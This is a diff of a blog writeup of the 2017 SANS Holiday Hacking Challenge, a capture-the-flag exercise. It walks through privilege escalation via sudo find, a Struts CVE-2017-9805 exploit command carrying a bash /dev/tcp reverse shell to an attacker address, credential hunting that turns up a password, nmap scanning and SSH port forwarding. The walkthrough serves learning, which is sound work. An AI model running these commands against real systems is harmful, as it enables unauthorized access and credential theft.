@@ -59,9 +59,13 @@
 			  <span class="post-date">Sat, Dec 16, 2017</span>
 			      
 
+<p>This year, I&rsquo;ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn&rsquo;t think it was interesting with real pentesting stuffs until I read the writeups, so I decided to start early this year.</p>
+
 <p><a href="#HHC17-Terminal">Terminal Challenges</a></p>
 
 <p><a href="#HHC17-GreatBook">Finding Great Book Pages</a></p>
+
+<p><a href="#HHC17-learned">Things I&rsquo;ve learned</a></p>
 
 <p><a name="HHC17-Terminal"></a></p>
 
@@ -167,8 +171,26 @@
 </span><span style="">We hope you can start the striper once again, with your vast bag of tricks.
 </span><span style="">Run the CandyCaneStriper executable to </span><span style="">complete</span><span style=""> this challenge.</span></code></pre>
 </div>
-<p>This time we are prompted to run a binary. It has no <code>execute</code> permission and we cannot set this permission for the binary as well.
-Refer to the tweet from Holly the Elf, I found a hint to the solution:
+<p>This time we are prompted to run a binary. It has no <code>execute</code> permission and we cannot set this permission for the binary as well.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@b83c138c0b53:~$ ls -la
+</span><span style="">total </span><span style="color:#ae81ff">68</span><span style="">
+</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> elf  elf   </span><span style="color:#ae81ff">4096</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">20</span><span style="">:00 .
+</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">5</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:31 ..
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> elf  elf    </span><span style="color:#ae81ff">220</span><span style=""> Aug </span><span style="color:#ae81ff">31</span><span style="">  </span><span style="color:#ae81ff">2015</span><span style=""> .bash_logout
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">3143</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 .bashrc
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> elf  elf    </span><span style="color:#ae81ff">655</span><span style=""> May </span><span style="color:#ae81ff">16</span><span style="">  </span><span style="color:#ae81ff">2017</span><span style=""> .profile
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">45224</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 CandyCaneStriper
+</span><span style="">elf@b83c138c0b53:~$ chmod +x CandyCaneStriper 
+</span><span style="">elf@b83c138c0b53:~$ ls -la
+</span><span style="">total </span><span style="color:#ae81ff">68</span><span style="">
+</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> elf  elf   </span><span style="color:#ae81ff">4096</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">20</span><span style="">:00 .
+</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">5</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:31 ..
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> elf  elf    </span><span style="color:#ae81ff">220</span><span style=""> Aug </span><span style="color:#ae81ff">31</span><span style="">  </span><span style="color:#ae81ff">2015</span><span style=""> .bash_logout
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">3143</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 .bashrc
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> elf  elf    </span><span style="color:#ae81ff">655</span><span style=""> May </span><span style="color:#ae81ff">16</span><span style="">  </span><span style="color:#ae81ff">2017</span><span style=""> .profile
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">45224</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 CandyCaneStriper</span></code></pre>
+</div>
+<p>Refer to the tweet from Holly the Elf, I found a hint to the solution:
 <code>https://twitter.com/GreenesterElf/status/938542480487677952</code>
 This is a 64-bit machine, so we need to find the linker at <code>/lib64/ld-linux-x86-64.so.2</code>. Let&rsquo;s try this out:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@b83c138c0b53:~$ /lib64/ld-linux-x86-64.so.2 /home/elf/CandyCaneStriper 
@@ -386,8 +408,10 @@ This is a 64-bit machine, so we need to find the linker at <code>/lib64/ld-linux
 </span><span style="">total </span><span style="color:#ae81ff">20684</span><span style="">
 </span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">15982592</span><span style=""> Nov </span><span style="color:#ae81ff">29</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:28 christmassongs.db
 </span><span style="">-rwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">5197352</span><span style=""> Dec  </span><span style="color:#ae81ff">7</span><span style=""> </span><span style="color:#ae81ff">15</span><span style="">:10 runtoanswer</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span><span style=""> </span><span style="color:#66d9ef">count</span><span style="">(</span><span style="">songid</span><span style="">)</span><span style=""> </span><span style="color:#66d9ef">count</span><span style="">,</span><span style=""> </span><span style="">songid</span><span style=""> </span><span style="color:#66d9ef">from</span><span style=""> </span><span style="">likes</span><span style=""> </span><span style="color:#66d9ef">group</span><span style=""> </span><span style="color:#66d9ef">by</span><span style=""> </span><span style="">songid</span><span style=""> </span><span style="color:#66d9ef">order</span><span style=""> </span><span style="color:#66d9ef">by</span><span style=""> </span><span style="color:#66d9ef">count</span><span style=""> </span><span style="color:#66d9ef">desc</span><span style=""> </span><span style="color:#66d9ef">limit</span><span style=""> </span><span style="color:#ae81ff">50</span><span style="">;</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">sqlite&gt; </span><span style="color:#66d9ef">select</span><span style=""> count</span><span style="color:#f92672">(</span><span style="">songid</span><span style="color:#f92672">)</span><span style=""> count, songid from likes group by songid order by count desc limit </span><span style="color:#ae81ff">50</span><span style="">;</span><span style="">
+</div>
+<p>To get the ID of the most popular song, I need to count the number of likes for each unique ID and then sort them in descending order. One way to do this is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span><span style=""> </span><span style="color:#66d9ef">count</span><span style="">(</span><span style="">songid</span><span style="">)</span><span style=""> </span><span style="color:#66d9ef">count</span><span style="">,</span><span style=""> </span><span style="">songid</span><span style=""> </span><span style="color:#66d9ef">from</span><span style=""> </span><span style="">likes</span><span style=""> </span><span style="color:#66d9ef">group</span><span style=""> </span><span style="color:#66d9ef">by</span><span style=""> </span><span style="">songid</span><span style=""> </span><span style="color:#66d9ef">order</span><span style=""> </span><span style="color:#66d9ef">by</span><span style=""> </span><span style="color:#66d9ef">count</span><span style=""> </span><span style="color:#66d9ef">desc</span><span style=""> </span><span style="color:#66d9ef">limit</span><span style=""> </span><span style="color:#ae81ff">10</span><span style="">;</span></code></pre>
+</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">sqlite&gt; </span><span style="color:#66d9ef">select</span><span style=""> count</span><span style="color:#f92672">(</span><span style="">songid</span><span style="color:#f92672">)</span><span style=""> count, songid from likes group by songid order by count desc limit </span><span style="color:#ae81ff">10</span><span style="">;</span><span style="">
 </span><span style=""></span><span style="color:#ae81ff">11325</span><span style="">|</span><span style="color:#ae81ff">392</span><span style="">
 </span><span style=""></span><span style="color:#ae81ff">2162</span><span style="">|</span><span style="color:#ae81ff">245</span><span style="">
 </span><span style=""></span><span style="color:#ae81ff">2140</span><span style="">|</span><span style="color:#ae81ff">265</span><span style="">
@@ -397,48 +421,7 @@ This is a 64-bit machine, so we need to find the linker at <code>/lib64/ld-linux
 </span><span style=""></span><span style="color:#ae81ff">2122</span><span style="">|</span><span style="color:#ae81ff">33</span><span style="">
 </span><span style=""></span><span style="color:#ae81ff">2120</span><span style="">|</span><span style="color:#ae81ff">130</span><span style="">
 </span><span style=""></span><span style="color:#ae81ff">2117</span><span style="">|</span><span style="color:#ae81ff">18</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2117</span><span style="">|</span><span style="color:#ae81ff">446</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2113</span><span style="">|</span><span style="color:#ae81ff">134</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2111</span><span style="">|</span><span style="color:#ae81ff">262</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2110</span><span style="">|</span><span style="color:#ae81ff">202</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2106</span><span style="">|</span><span style="color:#ae81ff">141</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2099</span><span style="">|</span><span style="color:#ae81ff">204</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2099</span><span style="">|</span><span style="color:#ae81ff">335</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2098</span><span style="">|</span><span style="color:#ae81ff">142</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2097</span><span style="">|</span><span style="color:#ae81ff">373</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2096</span><span style="">|</span><span style="color:#ae81ff">42</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2095</span><span style="">|</span><span style="color:#ae81ff">461</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2093</span><span style="">|</span><span style="color:#ae81ff">67</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2093</span><span style="">|</span><span style="color:#ae81ff">94</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2093</span><span style="">|</span><span style="color:#ae81ff">117</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2089</span><span style="">|</span><span style="color:#ae81ff">191</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2088</span><span style="">|</span><span style="color:#ae81ff">199</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2111</span><span style="">|</span><span style="color:#ae81ff">262</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2087</span><span style="">|</span><span style="color:#ae81ff">123</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2087</span><span style="">|</span><span style="color:#ae81ff">439</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2086</span><span style="">|</span><span style="color:#ae81ff">112</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2085</span><span style="">|</span><span style="color:#ae81ff">328</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2085</span><span style="">|</span><span style="color:#ae81ff">426</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2082</span><span style="">|</span><span style="color:#ae81ff">152</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2082</span><span style="">|</span><span style="color:#ae81ff">288</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2081</span><span style="">|</span><span style="color:#ae81ff">179</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2079</span><span style="">|</span><span style="color:#ae81ff">193</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2078</span><span style="">|</span><span style="color:#ae81ff">248</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2077</span><span style="">|</span><span style="color:#ae81ff">409</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2076</span><span style="">|</span><span style="color:#ae81ff">188</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2075</span><span style="">|</span><span style="color:#ae81ff">174</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2075</span><span style="">|</span><span style="color:#ae81ff">218</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2074</span><span style="">|</span><span style="color:#ae81ff">165</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2074</span><span style="">|</span><span style="color:#ae81ff">215</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2074</span><span style="">|</span><span style="color:#ae81ff">458</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2073</span><span style="">|</span><span style="color:#ae81ff">135</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2073</span><span style="">|</span><span style="color:#ae81ff">280</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2072</span><span style="">|</span><span style="color:#ae81ff">122</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2072</span><span style="">|</span><span style="color:#ae81ff">457</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2071</span><span style="">|</span><span style="color:#ae81ff">57</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2071</span><span style="">|</span><span style="color:#ae81ff">83</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2070</span><span style="">|</span><span style="color:#ae81ff">211</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2069</span><span style="">|</span><span style="color:#ae81ff">22</span></code></pre>
+</span><span style=""></span><span style="color:#ae81ff">2117</span><span style="">|</span><span style="color:#ae81ff">446</span></code></pre>
 </div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">sqlite&gt; </span><span style="color:#66d9ef">select</span><span style=""> * from songs where </span><span style="">id</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#ae81ff">392</span><span style="">;</span><span style="">
 </span><span style=""></span><span style="color:#ae81ff">392</span><span style="">|</span><span style="">Stairway to Heaven</span><span style="">|</span><span style="">Led Zeppelin</span><span style="">|</span><span style="color:#ae81ff">1971</span><span style="">|</span><span style="color:#e6db74">&#34;Stairway to Heaven&#34;</span><span style=""> is a song by the English rock band Led Zeppelin, released in late </span><span style="color:#ae81ff">1971</span><span style="">. It was composed by guitarist Jimmy Page and vocalist Robert Plant </span><span style="color:#66d9ef">for</span><span style=""> the band</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="">s untitled fourth studio album </span><span style="color:#f92672">(</span><span style="">often called Led Zeppelin IV</span><span style="color:#f92672">)</span><span style="">. It is often referred to as one of the greatest rock songs of all time.
 </span><span style="">
@@ -471,7 +454,27 @@ This is a 64-bit machine, so we need to find the linker at <code>/lib64/ld-linux
 </span><span style="">Restore /etc/shadow with the contents of /etc/shadow.bak, </span><span style="color:#66d9ef">then</span><span style=""> run </span><span style="color:#e6db74">&#34;inspect_da_b
 </span><span style="color:#e6db74">ox&#34;</span><span style=""> to </span><span style="">complete</span><span style=""> this challenge.
 </span><span style="">Hint: What commands can you run with sudo?</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@72830e537580:~$ sudo -g shadow find /etc/shadow -exec cp /etc/shadow.bak </span><span style="color:#f92672">{}</span><span style=""> </span><span style="color:#ae81ff">\;</span><span style="">
+</div>
+<p>Let&rsquo;s see what commands can be run with sudo</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@e4490931c153:~$ sudo -ll
+</span><span style="">Matching Defaults entries </span><span style="color:#66d9ef">for</span><span style=""> elf on e4490931c153:
+</span><span style="">    env_reset, mail_badpass, </span><span style="">secure_path</span><span style=""></span><span style="color:#f92672">=</span><span style="">/usr/local/sbin</span><span style="color:#ae81ff">\:</span><span style="">/usr/local/bin</span><span style="color:#ae81ff">\:</span><span style="">/usr/sbin</span><span style="color:#ae81ff">\:</span><span style="">/usr/bin</span><span style="color:#ae81ff">\:</span><span style="">/sbin</span><span style="color:#ae81ff">\:</span><span style="">/bin</span><span style="color:#ae81ff">\:</span><span style="">/snap/bin
+</span><span style="">User elf may run the following commands on e4490931c153:
+</span><span style="">Sudoers entry:
+</span><span style="">    RunAsUsers: elf
+</span><span style="">    RunAsGroups: shadow
+</span><span style="">    Options: !authenticate
+</span><span style="">    Commands:
+</span><span style="">        /usr/bin/find</span></code></pre>
+</div>
+<p>Have been tinkering with <code>find</code> for a while, I know it can execute commands on the results using the <code>-exec</code> flag, but I wasn&rsquo;t sure with what privileges it will execute the commands. These are the shadow files in <code>/etc</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@72830e537580:~$ ls -la /etc/shadow*
+</span><span style="">-rw-rw---- </span><span style="color:#ae81ff">1</span><span style=""> root shadow   </span><span style="color:#ae81ff">0</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">20</span><span style="">:00 /etc/shadow
+</span><span style="">-rw------- </span><span style="color:#ae81ff">1</span><span style=""> root root   </span><span style="color:#ae81ff">652</span><span style=""> Nov </span><span style="color:#ae81ff">14</span><span style=""> </span><span style="color:#ae81ff">13</span><span style="">:48 /etc/shadow-
+</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root   </span><span style="color:#ae81ff">677</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 /etc/shadow.bak</span></code></pre>
+</div>
+<p>The file we need to restore belongs to the <code>shadow</code> group and it has read+write group permission. My solution is to let <code>find</code> find this file (no pun intended) and then copy the backup shadow file over it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@72830e537580:~$ sudo -g shadow find /etc/shadow -exec cp /etc/shadow.bak </span><span style="color:#f92672">{}</span><span style=""> </span><span style="color:#ae81ff">\;</span><span style="">
 </span><span style="">elf@72830e537580:~$ ls -la /etc/shadow*
 </span><span style="">-rw-rw---- </span><span style="color:#ae81ff">1</span><span style=""> root shadow </span><span style="color:#ae81ff">677</span><span style=""> Jan  </span><span style="color:#ae81ff">6</span><span style=""> </span><span style="color:#ae81ff">10</span><span style="">:23 /etc/shadow
 </span><span style="">-rw------- </span><span style="color:#ae81ff">1</span><span style=""> root root   </span><span style="color:#ae81ff">652</span><span style=""> Nov </span><span style="color:#ae81ff">14</span><span style=""> </span><span style="color:#ae81ff">13</span><span style="">:48 /etc/shadow-
@@ -557,7 +560,14 @@ This is a 64-bit machine, so we need to find the linker at <code>/lib64/ld-linux
 
 <p><em>For hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips.</em></p>
 
-<p>Visit the Lettes to Santa application and read the source code, I encountered an interesting hidden field on line 243</p>
+<p>tl;dr:</p>
+
+<ul>
+<li>The topic of the page is <code>On the topic of Flying Animals</code>.</li>
+<li>The password is <code>stream_unhappy_buy_loss</code>.</li>
+</ul>
+
+<p>Visit the Lettes to Santa application and read the source code, I encountered an interesting hidden field   on line 243</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;!-- Development version --&gt;
     &lt;a href=&#34;http://dev.northpolechristmastown.com&#34; style=&#34;display: none;&#34;&gt;Access Development Version&lt;/a&gt;</code></pre>
 </div>
@@ -582,21 +592,64 @@ On Kali box:</p>
 <p>To exploit:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders/542 -c </span><span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/&lt;public-ip-goes-here&gt;/443 0&gt;&amp;1&#34;</span></code></pre>
 </div>
-<p>It took me a long time</p>
+<p>It took me a long time after getting the shell to find the password because I overlooked the result coming from grep and things doesn&rsquo;t work well over this netcat shell. I decided to setup persistence and upgraded my shell using msfvenom reverse_tcp shell.</p>
 
+<p>While trying to get Alabaster Snowball&rsquo;s password, the only place I can think of to have password is the tomcat manager. The application is located in <code>/opt/apache-tomcat</code>. I looked into <code>tomcat_users.xml</code> but no luck. After a few hours trying to grep with keywords like <code>pass, password, alabaster</code>, I was able to find the password in <code>apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span><span style=""> </span><span style="color:#66d9ef">class</span><span style=""> </span><span style="color:#a6e22e">Connect</span><span style=""> </span><span style="color:#f92672">{</span><span style="">
+</span><span style="">            </span><span style="color:#66d9ef">final</span><span style=""> </span><span style="">String</span><span style=""> </span><span style="">host</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#34;localhost&#34;</span><span style="color:#f92672">;</span><span style="">
+</span><span style="">            </span><span style="color:#66d9ef">final</span><span style=""> </span><span style="">String</span><span style=""> </span><span style="">username</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#34;alabaster_snowball&#34;</span><span style="color:#f92672">;</span><span style="">
+</span><span style="">            </span><span style="color:#66d9ef">final</span><span style=""> </span><span style="">String</span><span style=""> </span><span style="">password</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#34;stream_unhappy_buy_loss&#34;</span><span style="color:#f92672">;</span><span style="">   
+</span><span style="">            </span><span style="">String</span><span style=""> </span><span style="">connectionURL</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#34;jdbc:mysql://&#34;</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="">host</span><span style=""> </span><span style="color:#f92672">+</span><span style=""> </span><span style="color:#e6db74">&#34;:3306/db?user=;password=&#34;</span><span style="color:#f92672">;</span><span style="">
+</span><span style="">            </span><span style="">Connection</span><span style=""> </span><span style="">connection</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#66d9ef">null</span><span style="color:#f92672">;</span><span style="">
+</span><span style="">            </span><span style="">Statement</span><span style=""> </span><span style="">statement</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#66d9ef">null</span><span style="color:#f92672">;</span></code></pre>
+</div>
 <p>Password: <code>stream_unhappy_buy_loss</code></p>
+
+<p>Note on this part:</p>
+
+<ul>
+<li>The netcat shell initially had really limited capabilities. I needed to change the <code>PATH</code> environment variable to be able to use more commands</li>
+<li>The file <code>GreatBookPage2.pdf</code> was right on the root of <code>https://l2s.northpolechristmastown.com/</code>. I didn&rsquo;t figure that out until I got the shell and was poking around with the application.</li>
+</ul>
+
+<p><strong>NEVER HARDCODE PASSWORDS!</strong></p>
 
 <p><em>3. The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?</em></p>
 
 <p><em>For hints, please see Holly Evergreen in the Cryokinetic Magic Level.</em></p>
 
+<p>tl;dr:</p>
+
+<ul>
+<li>The file share name is <code>FileStor</code>.</li>
+</ul>
+
 <p>I made a mistake on this part, which took me a while to figure out the correct smb server. I read over the hint about host discovery and did a normal nmap scan, which is sure to miss the correct smb server.</p>
 
 <p>The right way to do the nmap was:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"></code></pre>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">nmap -v -PS445 </span><span style="color:#ae81ff">10</span><span style="">.142.0.0/24
+</span><span style="">
+</span><span style="">Nmap scan report </span><span style="color:#66d9ef">for</span><span style=""> hhc17-smb-server.c.holidayhack2017.internal </span><span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="">.142.0.7</span><span style="color:#f92672">)</span><span style="">
+</span><span style="">Host is up </span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="">.00056s latency</span><span style="color:#f92672">)</span><span style="">.
+</span><span style="">Not shown: </span><span style="color:#ae81ff">996</span><span style=""> filtered ports
+</span><span style="">PORT     STATE SERVICE
+</span><span style=""></span><span style="color:#ae81ff">135</span><span style="">/tcp  open  msrpc
+</span><span style=""></span><span style="color:#ae81ff">139</span><span style="">/tcp  open  netbios-ssn
+</span><span style=""></span><span style="color:#ae81ff">445</span><span style="">/tcp  open  microsoft-ds
+</span><span style=""></span><span style="color:#ae81ff">3389</span><span style="">/tcp open  ms-wbt-server
+</span><span style="">
+</span><span style="">Nmap scan report </span><span style="color:#66d9ef">for</span><span style=""> hhc17-emi.c.holidayhack2017.internal </span><span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="">.142.0.8</span><span style="color:#f92672">)</span><span style="">
+</span><span style="">Host is up </span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="">.00018s latency</span><span style="color:#f92672">)</span><span style="">.
+</span><span style="">Not shown: </span><span style="color:#ae81ff">995</span><span style=""> closed ports
+</span><span style="">PORT     STATE SERVICE
+</span><span style=""></span><span style="color:#ae81ff">80</span><span style="">/tcp   open  http
+</span><span style=""></span><span style="color:#ae81ff">135</span><span style="">/tcp  open  msrpc
+</span><span style=""></span><span style="color:#ae81ff">139</span><span style="">/tcp  open  netbios-ssn
+</span><span style=""></span><span style="color:#ae81ff">445</span><span style="">/tcp  open  microsoft-ds
+</span><span style=""></span><span style="color:#ae81ff">3389</span><span style="">/tcp open  ms-wbt-server</span></code></pre>
 </div>
-<p>Since the victim machine doesn&rsquo;t have smbclient on it, I need to setup a SSH portforward so that I can access the share from my kali box.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">ssh -L </span><span style="color:#ae81ff">445</span><span style="">:10.142.0.8:445 alabaster_snowball@dev.northpolechristmastown.com</span></code></pre>
+<p>The correct smb server is <code>10.142.0.7</code>. Since the victim machine (in #2) doesn&rsquo;t have smbclient on it, I need to setup a SSH port forward so that I can access the share from my kali box.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">ssh -L </span><span style="color:#ae81ff">445</span><span style="">:10.142.0.7:445 alabaster_snowball@dev.northpolechristmastown.com</span></code></pre>
 </div>
 <p>I am then able to list the shares.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">smbclient -L </span><span style="color:#ae81ff">127</span><span style="">.0.0.1 -U alabaster_snowball
@@ -631,6 +684,48 @@ On Kali box:</p>
 
 <p><em>Pepper Minstix provides some hints for this challenge on the There&rsquo;s Snow Place Like Home Level.</em></p>
 
+<p>I didn&rsquo;t finish this one. However, I did found interesting stuffs.</p>
+
+<p>According to the hints, there is something to do with hiding things from search engines. I then proceeded to check out <code>robots.txt</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">User-agent: *
+</span><span style="">Disallow: /cookie.txt</span></code></pre>
+</div>
+<p><code>cookie.txt</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style=""></span><span style="color:#75715e">//FOUND THESE FOR creating and validating cookies. Going to use this in node js
+</span><span style="color:#75715e"></span><span style="">    </span><span style="color:#66d9ef">function</span><span style=""> </span><span style="color:#a6e22e">cookie_maker</span><span style="">(</span><span style="color:#a6e22e">username</span><span style="">,</span><span style=""> </span><span style="color:#a6e22e">callback</span><span style="">){</span><span style="">
+</span><span style="">        </span><span style="color:#66d9ef">var</span><span style=""> </span><span style="color:#a6e22e">key</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74">&#39;need to put any length key in here&#39;</span><span style="">;</span><span style="">
+</span><span style="">        </span><span style="color:#75715e">//randomly generates a string of 5 characters
